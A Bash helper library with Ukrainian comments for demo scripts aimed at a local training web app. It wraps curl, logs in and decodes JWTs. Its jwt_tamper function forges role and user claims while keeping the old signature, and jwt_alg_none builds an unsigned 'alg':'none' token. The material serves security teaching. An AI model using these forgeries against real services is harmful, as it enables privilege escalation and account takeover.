#!/bin/bash
# Спільні функції демонстраційних скриптів. Усі запити йдуть лише на локальний навчальний застосунок.
BASE="${BASE:-http://localhost:8086}"
JSON='Content-Type: application/json'

# Скорочує токени у виводі: початок і кінець, середина замінена на три крапки
shorten() {
  sed -E 's/(eyJ[A-Za-z0-9_-]{12})[A-Za-z0-9_.-]*([A-Za-z0-9_-]{6})/\1...\2/g'
}

# Показ аргументів як у терміналі: прості лишаються як є, решта в одинарних лапках
show_args() {
  local a
  for a in "$@"; do
    if [[ "$a" =~ ^[A-Za-z0-9_./:@=%+,-]+$ ]]; then printf '%s ' "$a"; else printf "'%s' " "$a"; fi
  done
}

# http "опис" curl-аргументи... : друкує команду, тіло відповіді й статус (токени скорочено)
http() {
  local out
  echo
  echo "# $1"; shift
  echo "\$ curl -s -w '\\nHTTP %{http_code}\\n' $(show_args "$@" | shorten | sed 's/ $//')"
  out=$(curl -s -w '\nHTTP %{http_code}\n' "$@")
  echo "$out" | shorten
  LAST_BODY=$(echo "$out" | sed '$d')
}

# Токен із відповіді входу (LAST_BODY): поле accessToken
token_from_body() {
  python3 -I -c 'import json,sys; print(json.loads(sys.argv[1])["accessToken"])' "$1"
}

# Вхід користувача без друку: повертає токен
get_token() {
  local body
  body=$(curl -s -X POST "$BASE/api/auth/login" -H "$JSON" -d "{\"login\":\"$1\",\"password\":\"$2\"}")
  token_from_body "$body"
}

# Декодування частин токена (base64url, не шифрування): заголовок, вміст і різниця exp - iat
jwt_decode() {
  python3 -I - "$1" <<'PY'
import base64, json, sys
def part(s):
    return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
h, p, _ = sys.argv[1].split(".")
header, payload = part(h), part(p)
print("header:  ", json.dumps(header))
print("payload: ", json.dumps(payload))
print("exp - iat =", payload["exp"] - payload["iat"], "с")
PY
}

# Підроблений токен: змінює вміст (sub, role), підпис лишає старий
jwt_tamper() {
  python3 -I - "$1" <<'PY'
import base64, sys
h, p, s = sys.argv[1].split(".")
raw = base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)).decode()
raw = raw.replace("olena_k", "manager").replace("CLIENT", "MANAGER")
print(h + "." + base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=") + "." + s)
PY
}

# Токен з алгоритмом none: підпису немає, вміст узято з справжнього токена
jwt_alg_none() {
  python3 -I - "$1" <<'PY'
import base64, sys
h, p, s = sys.argv[1].split(".")
head = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
print(head + "." + p + ".")
PY
}
